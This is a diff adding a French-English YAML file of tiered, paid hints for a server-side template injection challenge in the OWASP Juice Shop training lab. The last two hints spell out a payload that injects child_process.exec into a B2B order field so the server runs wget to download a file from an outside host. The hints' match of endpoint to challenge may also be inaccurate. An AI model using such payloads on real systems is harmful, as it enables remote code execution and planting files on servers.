@@ -1,0 +1,116 @@
+challenge_key: "sstiChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Le hint OWASP officiel #1 a deux infos critiques. (1) "SSTi is
+      a clear indicator that this has nothing to do with anything
+      Angular" — donc pas le frontend, pas une XSS. (2) "make sure
+      to use only our non-malicious malware". Tu as donc deux
+      sous-problemes : (a) trouver l'endpoint serveur vulnerable a
+      SSTI, (b) trouver le malware approuve par OWASP.
+    text_en: |
+      Official OWASP hint #1 has two critical pieces. (1) "SSTi
+      is a clear indicator that this has nothing to do with
+      anything Angular" — so not the frontend, not an XSS. (2)
+      "make sure to use only our non-malicious malware". You
+      therefore have two sub-problems: (a) find the server
+      endpoint vulnerable to SSTI, (b) find the malware approved
+      by OWASP.
+    pedagogical_intent: |
+      Decompose the challenge into two sub-problems.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      Pour le malware (sub-probleme b), hint OWASP officiel #2 :
+      "very obvious Google search or by stumbling into a very
+      ill-placed quarantine folder". Cherche dans le bundle
+      backend ou dans les dossiers exposes du serveur Juice Shop
+      un fichier nomme avec une extension peu commune. Indice :
+      ".efb" est l'extension du malware fictif officiel OWASP
+      Juice Shop, le fichier s'appelle juicy.efb.
+    text_en: |
+      For the malware (sub-problem b), official OWASP hint #2:
+      "very obvious Google search or by stumbling into a very
+      ill-placed quarantine folder". Look in the backend bundle
+      or in exposed server folders of Juice Shop for a file with
+      an uncommon extension. Hint: ".efb" is the official OWASP
+      Juice Shop fictitious malware extension, file name
+      juicy.efb.
+    pedagogical_intent: |
+      Pin down the malware identity.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Pour l'endpoint vulnerable (sub-probleme a) : Juice Shop a
+      une feature de processing de commandes B2B sous /b2b/v2/
+      orders. Cette feature accepte un body JSON et passe certains
+      champs a un template engine cote serveur (vm.runInNewContext
+      Node.js). Hint OWASP #3 : "Making the server download and
+      execute the malware is key to solving this challenge". Quel
+      payload force le serveur a faire un download HTTP ?
+    text_en: |
+      For the vulnerable endpoint (sub-problem a): Juice Shop has
+      a B2B order processing feature under /b2b/v2/orders. This
+      feature takes a JSON body and passes certain fields to a
+      server-side template engine (vm.runInNewContext Node.js).
+      OWASP hint #3: "Making the server download and execute the
+      malware is key to solving this challenge". Which payload
+      forces the server to perform an HTTP download?
+    pedagogical_intent: |
+      Localize the SSTI surface and connect to the malware-fetch goal.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Le payload SSTI Node.js classique pour exec une commande
+      systeme via vm est : require('child_process').exec('cmd').
+      Pour ce challenge, exec doit lancer wget ou curl pour
+      telecharger juicy.efb depuis l'URL OWASP officielle (ou un
+      mirror local) puis le sauvegarder dans le folder du serveur.
+      Squelette du body JSON envoye a /b2b/v2/orders : un champ
+      contenant une expression template comme
+      orderLinesData = "<expression vm>".
+    text_en: |
+      Classic Node.js SSTI payload for system command execution
+      via vm: require('child_process').exec('cmd'). For this
+      challenge, exec must run wget or curl to download juicy.efb
+      from the official OWASP URL (or a local mirror) then save
+      it to the server folder. JSON body skeleton sent to
+      /b2b/v2/orders: a field containing a template expression
+      like orderLinesData = "<vm expression>".
+    pedagogical_intent: |
+      Spell the exec payload structure.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      Cette quasi-solution depend de la version exacte de Juice
+      Shop installee. La forme generale du payload :
+      POST /b2b/v2/orders avec body
+      { "orderLinesData": "(function(){ require('child_process').
+      exec('wget https://download.vulnerabilities.io/juicy.efb -O
+      ./uploads/complaints/juicy.efb'); })()" }
+      Le serveur evalue le template, exec lance wget, juicy.efb
+      apparait dans le folder uploads. Le challenge se valide
+      automatiquement a la presence du fichier sur le filesystem.
+      Vrai test : verifie d'abord la version Juice Shop et
+      l'existence de l'endpoint /b2b/v2/orders dans ton instance.
+    text_en: |
+      This quasi-solution depends on the exact installed Juice
+      Shop version. General payload shape:
+      POST /b2b/v2/orders with body
+      { "orderLinesData": "(function(){ require('child_process').
+      exec('wget https://download.vulnerabilities.io/juicy.efb
+      -O ./uploads/complaints/juicy.efb'); })()" }
+      The server evaluates the template, exec runs wget, juicy.efb
+      appears in the uploads folder. The challenge solves
+      automatically once the file is on disk. Real test: first
+      verify your Juice Shop version and the existence of the
+      /b2b/v2/orders endpoint in your instance.
+    pedagogical_intent: |
+      Quasi-solution : full payload + version-dependency caveat.
